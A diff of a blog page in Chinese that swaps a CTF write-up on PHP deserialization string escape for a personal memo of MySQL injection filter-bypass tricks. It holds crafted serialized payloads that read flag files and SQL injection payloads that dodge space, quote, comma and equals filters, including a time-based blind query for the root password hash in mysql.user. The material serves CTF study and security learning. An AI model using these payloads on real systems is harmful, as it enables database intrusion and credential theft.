@@ -20,22 +20,31 @@
     <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="刷了一下CTF反序列化的题，去年没有好好了解。又补了一次PHP，害太菜了。每天看看别人的博客真的可以鼓舞人。简单记录一下两道字符串逃逸问题 推荐一个反序列化总结的很好的笔记https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wjrblogs&#x2F;p&#x2F;12800358.html 123456789101112131415161718192021222324&#x2F;&#x2F;变长 直接构造多个关键词，这样就能逃出几个字符&amp;">
+    <meta name="description" content="MYSQL一些技巧 仅仅是作为自己备忘录，如果错误，敬请斧正。  0)基础饶过123456781.大小写绕过2.双写绕过3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;5.宽字节、Latin1默认编码Latin1编码：[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF反序列字符串逃逸">
-<meta property="og:url" content="http://example.com/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/index.html">
+<meta property="og:title" content="Mysql注入技巧备忘录">
+<meta property="og:url" content="http://example.com/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="刷了一下CTF反序列化的题，去年没有好好了解。又补了一次PHP，害太菜了。每天看看别人的博客真的可以鼓舞人。简单记录一下两道字符串逃逸问题 推荐一个反序列化总结的很好的笔记https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wjrblogs&#x2F;p&#x2F;12800358.html 123456789101112131415161718192021222324&#x2F;&#x2F;变长 直接构造多个关键词，这样就能逃出几个字符&amp;">
+<meta property="og:description" content="MYSQL一些技巧 仅仅是作为自己备忘录，如果错误，敬请斧正。  0)基础饶过123456781.大小写绕过2.双写绕过3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;5.宽字节、Latin1默认编码Latin1编码：[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-05-03T14:48:00.000Z">
-<meta property="article:modified_time" content="2021-07-17T09:30:47.940Z">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gr0tfjp3joj30y70axmzz.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gr0tfrwc97j30yw0antbi.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a29k7b4j30hs08pdgd.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a43e5wgj61080a6q5x02.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gr1au2dkhsj30nm06qt8z.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gr1cfj1sn7j30tf07dq4x.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gr1ft5dvypj30z506omxd.jpg">
+<meta property="article:published_time" content="2021-07-17T13:47:00.000Z">
+<meta property="article:modified_time" content="2021-07-17T13:47:55.036Z">
 <meta property="article:author" content="R0ser1">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>CTF反序列字符串逃逸 · R0ser1&#39;s Blog</title>
+    <title>Mysql注入技巧备忘录 · R0ser1&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -249,7 +258,7 @@
             <a href="/" >R0ser1&#39;s Blog</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name">CTF反序列字符串逃逸</a>
+            <a href="#" class="post-name">Mysql注入技巧备忘录</a>
         </div>
     </div>
     
@@ -292,7 +301,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            CTF反序列字符串逃逸
+            Mysql注入技巧备忘录
             <!-- 404 -->
             
         </h1>
@@ -311,18 +320,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.1k</span>Reading time: <span class="post-count reading-time">5 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.5k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2021/05/03</span>
+                    <span class="post-intro-time">2021/07/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -446,33 +455,125 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>刷了一下CTF反序列化的题，去年没有好好了解。又补了一次PHP，害太菜了。每天看看别人的博客真的可以鼓舞人。简单记录一下两道字符串逃逸问题</p>
-<p>推荐一个反序列化总结的很好的笔记<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12800358.html">https://www.cnblogs.com/wjrblogs/p/12800358.html</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变长 直接构造多个关键词，这样就能逃出几个字符</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">255</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]) &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = [</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>],</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    @unserialize(waf(serialize(<span class="variable">$a</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h2 id="MYSQL一些技巧"><a href="#MYSQL一些技巧" class="headerlink" title="MYSQL一些技巧"></a>MYSQL一些技巧</h2><blockquote>
+<p>仅仅是作为自己备忘录，如果错误，敬请斧正。</p>
+</blockquote>
+<h3 id="0-基础饶过"><a href="#0-基础饶过" class="headerlink" title="0)基础饶过"></a>0)基础饶过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">2.双写绕过</span><br><span class="line">3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;</span><br><span class="line">5.宽字节、Latin1默认编码</span><br><span class="line">Latin1编码：</span><br><span class="line">[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有</span><br><span class="line">而utf8中没有的字符，而Mysql是如何处理这些字符的呢？直接忽略。</span><br><span class="line">于是我们可以输入?username&#x3D;admin%c2，存储至表中就变为了admin上面的%c2可以换为%c2-%ef之间的任意字符]</span><br></pre></td></tr></table></figure>
+<h3 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1)过滤空格"></a>1)过滤空格</h3><blockquote>
+<p>反引号</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from&#96;user&#96;;</span><br></pre></td></tr></table></figure>
 
-<p>flag-&gt;index 长度增加1 逃逸的长度为49 所以需要49的flag<br><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</code><br>(waf(serialize($a))   ——   flag index 替换了所以[flag.php]要用16进制 然后 s:8  其中S必须大写才会存在16进制<br><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;\66\6c\61\67\2E\70\68\70&quot;;&#125;&#125;</code> //  i:0 键名无所谓已近到下一层了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变短 通过键逃逸和值逃逸--------分析思路 先分析再做题 不然思路真的很乱</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter_arr</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>) &#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>括号</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; &#39;and(true)like(false)union(select(pass)from(users))#</span><br></pre></td></tr></table></figure>
 
-<p>$serialize_info = filter(serialize($_SESSION)); 序列化 SESSION<strong>数组</strong>并且过滤 然后看到$function == ‘phpinfo’<br>我们去phpinfo查看很容易看到d0g3_f1ag.php和PHP处理器<br>但是这个题目里没有读取session文件，这个题只是把$SESSION<strong>数组</strong>进行了serialize().这种地方不要因为看到php处理器而犯迷糊。</p>
-<p>所以我们大概明确了就是<br><code>$userinfo[&#39;img&#39;]=d0g3_f1ag.php 或者 base64_decode($userinfo[&#39;img&#39;])=ZDBnM19mMWFnLnBocA==即可</code></p>
-<p>其中$_SESSION[‘user’]之后有一个extract($_POST); 根据extract()我们可以进行变量覆盖<br>extract() 函数从数组中将变量导入到当前的符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;funtion&quot;</span>] = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line">请求?_SESSION[test]=xxx</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;xxx&#x27;</span> (length=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>/**/</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;select*from&#x2F;**&#x2F;users;</span><br></pre></td></tr></table></figure>
 
-<p>值逃逸：需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对~~</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;  <span class="comment">//后面加的是为了键和值保持一致 随便 加前面用_SESSION[xx]=xxx同理</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>and/or后面可以跟上偶数个!、~可以替代空格,可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or- -!!!1&#x3D;1；</span><br></pre></td></tr></table></figure>
 
-<p>这样我们需要把下一个的键和值当成第一个的值， x代表数字 下一个的值和键需要多少位 然后flag构造多少 因为flag-&gt;NULL了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag   ==&gt;  s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:x:<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格。</p>
+<p>下面逗号是两列的意思 1e0占了第二列,同样，上面的1E0可以用1.0代替。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select A,1E0fromB</span><br></pre></td></tr></table></figure>
 
-<p>  其中最后一个”会给下一个键一起成为上一个的值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>   ==&gt;  <span class="title">s</span>:7:<span class="title">function</span></span>;s:x:<span class="string">&quot;&quot;</span> </span><br><span class="line"> s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;[&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a]&quot;</span>  <span class="comment">//括号是值</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>\N 绕过,绕过NULL,因为\N相当于NULL</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pass where id&#x3D;\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),&#39;v&#39;)in(&#39;v&#39;);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//键逃逸`，这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~</span></span><br><span class="line">_SESSION[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;flagphp [&quot;</span>;s:<span class="number">67</span>:] <span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>空格还可以使用如下替代：</p>
+<blockquote>
+<p>在php中 \s 会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">09：Horizontal Tab</span><br><span class="line">0A：New Line</span><br><span class="line">0B：Vertical Tab</span><br><span class="line">0C：New Page</span><br><span class="line">0D：Carriage Return</span><br><span class="line">A0：Non-breaking Space</span><br><span class="line">20：Space</span><br><span class="line">a0：空格</span><br><span class="line">2B：+</span><br></pre></td></tr></table></figure>
 
-<p>过滤的键然后他的值的属性 成为键的值  先计算键的值然后再去构造键。然后查看源代码 </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">将/d0g3_fllllllag base64编码就好。</span><br></pre></td></tr></table></figure>
+<h3 id="2-过滤单引号："><a href="#2-过滤单引号：" class="headerlink" title="2)过滤单引号："></a>2)过滤单引号：</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/105061424">https://blog.csdn.net/qq_42181428/article/details/105061424</a></p>
+</blockquote>
+<h3 id="3-过滤注释符"><a href="#3-过滤注释符" class="headerlink" title="3)过滤注释符"></a>3)过滤注释符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;%00  空字节     </span><br><span class="line">&#96;     反引号   </span><br><span class="line">\#     哈希值</span><br><span class="line">-- x   SQL 语法[x为任意 前面有一个空格]</span><br><span class="line">只要闭合单引号或者其他就行  and &#39;x&#39;&#x3D;&#39;x</span><br></pre></td></tr></table></figure>
 
-<p>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/104118688/">https://blog.csdn.net/a3320315/article/details/104118688/</a></p>
+<p>shch as:</p>
+<p>条件苛刻 报错测试用不了 union可以的。其他没测试,盲注时需要加@。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE id &#x3D; &#39;&#39; UNION SELECT 1, 2, 3&#96;&#39; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-过滤逗号"><a href="#4-过滤逗号" class="headerlink" title="4)过滤逗号"></a>4)过滤逗号</h3><p>1、在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决:</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;select substr(database() from 1 for 1);</span><br><span class="line">&gt;select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>2、点击我查看Join<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/14829001.html">绕过逗号</a></p>
+<p>3、使用like</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))&#x3D;80   #等价于</span><br><span class="line">select user() like &#39;r%&#39;</span><br><span class="line">有就返回1 无返回0</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>4、对于limit可以使用offset来绕过：</p>
+<blockquote>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="meta"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news limit <span class="number">1</span> offset <span class="number">0</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>5、case when then</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when substring((select password from mysql.user where user&#x3D;&#39;root&#39;) from 1 for 1)&#x3D;&#39;e&#39; then sleep(5) else 0 end #</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/88933173">https://blog.csdn.net/zz_Caleb/article/details/88933173</a></p>
+<h3 id="5-过滤等号"><a href="#5-过滤等号" class="headerlink" title="5)过滤等号"></a>5)过滤等号</h3><blockquote>
+<p>find_in_set(mid(user(),1,1),’a,b,c,d’) 如果当前用户的第一个字符不在 ‘a,b,c…’ 字符串中，返回0；如果在字符串中，则返回那个字母的索引。如图，r 在字符串中第18个位置。</p>
+</blockquote>
+<p>数据库中，索引的位置返回时间。</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg" alt="shujuku"></p>
+<p>实战中要测试，最开始没有R的时候需要2S，然后加上R就是7，而R的位置是5。</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gr0tfjp3joj30y70axmzz.jpg" alt="1sel"></p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gr0tfrwc97j30yw0antbi.jpg" alt="2sellp"></p>
+<blockquote>
+<p>mid(user(),1,1) 返回当前用户的第一个字符,如果当前用户第一个字符在集合后面，返回1，否则返回0。</p>
+</blockquote>
+<p>数据库中</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a29k7b4j30hs08pdgd.jpg" alt="sellp"></p>
+<p>ord(1)=49,ord(0)=48。所以正确就返回7s。</p>
+<p><strong>实战测试中</strong></p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a43e5wgj61080a6q5x02.jpg" alt="test"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1)regexp操作符用于配匹正则表达式， id regexp 1 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">2)&lt;&gt;等价于!&#x3D; 所以在前面加一个!结果就是等号 !(id&lt;&gt;1) 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">3)使用大小于号来绕过，id &gt; 1 and id &lt; 3 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">4)不加通配符的like、rlike执行的效果和 &#x3D; 一致</span><br><span class="line"></span><br><span class="line">5)between a and b ：范围在a-b之间 id between 1 and 1 与 id &#x3D; 1 效果相同</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-过滤过滤比较符号-（-lt-和-gt-）"><a href="#6-过滤过滤比较符号-（-lt-和-gt-）" class="headerlink" title="6)过滤过滤比较符号 （ &lt; 和 &gt; ）"></a>6)过滤过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h3><p>使用<strong>greatest()、least（）函数</strong>绕过</p>
+<blockquote>
+<p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
+<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
+
